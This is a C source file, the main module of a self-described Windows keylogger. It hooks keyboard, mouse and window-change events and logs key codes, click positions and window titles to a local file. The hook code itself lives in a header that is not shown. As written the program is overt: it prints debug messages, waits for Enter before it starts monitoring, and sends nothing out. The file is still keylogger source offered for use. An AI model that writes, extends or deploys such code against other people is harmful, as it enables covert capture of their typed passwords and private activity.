#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include "hooks.h"
#include "buffer.h"
#include "logger.h"
#include "utils.h"

static volatile int running = 1;

// Function is triggered by hooks and processes different types of events
static void event_callback(const Event* event) {
    if (!event) return;
    
    printf("Event received: type=%d\n", event->type);

    // Buffer to format event data for logging
    char event_data[1024];

     // Handle different event types
    switch(event->type) {
        case EVENT_KEY_PRESS:
            printf("Key Press Detected: %lu\n", event->data.keyboard.vkCode);
            snprintf(event_data, sizeof(event_data), "Key Press: %lu\n", 
                    event->data.keyboard.vkCode);
            break;
        case EVENT_MOUSE_CLICK:
            printf("Mouse Click Detected: (%ld, %ld)\n",
                   event->data.mouse.position.x, event->data.mouse.position.y);
            snprintf(event_data, sizeof(event_data), "Mouse Click: (%ld, %ld)\n", 
                    event->data.mouse.position.x, event->data.mouse.position.y);
            break;
        case EVENT_WINDOW_CHANGE:
            printf("Window Change Detected: %s\n", event->data.window.title);
            snprintf(event_data, sizeof(event_data), "Window Change: %s\n", 
                    event->data.window.title);
            break;
        default:
            return;
    }
    
    // Add event to buffer and write it to log file
    add_to_buffer(event_data, strlen(event_data));
}

void cleanup_handler(int signum) {
    printf("Signal received: %d. Setting running to 0.\n", signum);
    force_flush_buffer();  // Flush any remaining events before exit
    running = 0;
}

// Entry point of the keylogger program
int main() {
    DWORD error;
    char input;
    
    printf("Keylogger starting...\n");
    printf("[DEBUG] Setting up signal handlers...\n");
    signal(SIGINT, cleanup_handler);
    signal(SIGTERM, cleanup_handler);

    // Create logs directory if it doesn't exist
    if (!create_directory_if_needed("logs")) {
        fprintf(stderr, "Failed to create logs directory\n");
        return 1;
    }

    // Initialize logger
    printf("[DEBUG] Initializing logger...\n");
    if (!init_logger("logs/keylog.txt")) {
        fprintf(stderr, "Failed to initialize logger\n");
        return 1;
    }
    printf("[DEBUG] Logger initialized successfully\n");

    // Initialize hooks
    printf("[DEBUG] Initializing hooks...\n");
    if (!init_hooks(event_callback)) { 
        error = GetLastError();
        fprintf(stderr, "Failed to initialize hooks (Error: %lu)\n", error);
        cleanup_logger();
        return 1;
    }
    printf("[DEBUG] Hooks initialized successfully\n");

    // Initialize buffer
    printf("[DEBUG] Initializing buffer...\n");
    if (!init_buffer()) {
        cleanup_hooks();
        cleanup_logger();
        fprintf(stderr, "Failed to initialize buffer\n");
        return 1;
    }
    printf("[DEBUG] Buffer initialized successfully\n");
    
    // Wait for user input
    printf("[DEBUG] Press Enter to start monitoring (or Ctrl+C to exit)...\n");
    fflush(stdout);
    input = getchar();
    printf("[DEBUG] Received input: %d\n", input);

    printf("[DEBUG] Starting main loop. Press Ctrl+C to exit.\n");
    fflush(stdout);

    // // Main loop: continuously process events
    while (running) {
        printf("[DEBUG] Processing events...\n");
        fflush(stdout);
        if (!process_events()) {
            printf("[DEBUG] Error processing events\n");
        }
        Sleep(100);
    }
    
    // Perform cleanup after termination
    printf("[DEBUG] Cleaning up...\n");
    cleanup_logger();
    cleanup_buffer();
    cleanup_hooks();
    printf("[DEBUG] Cleanup complete\n");

    return 0;
}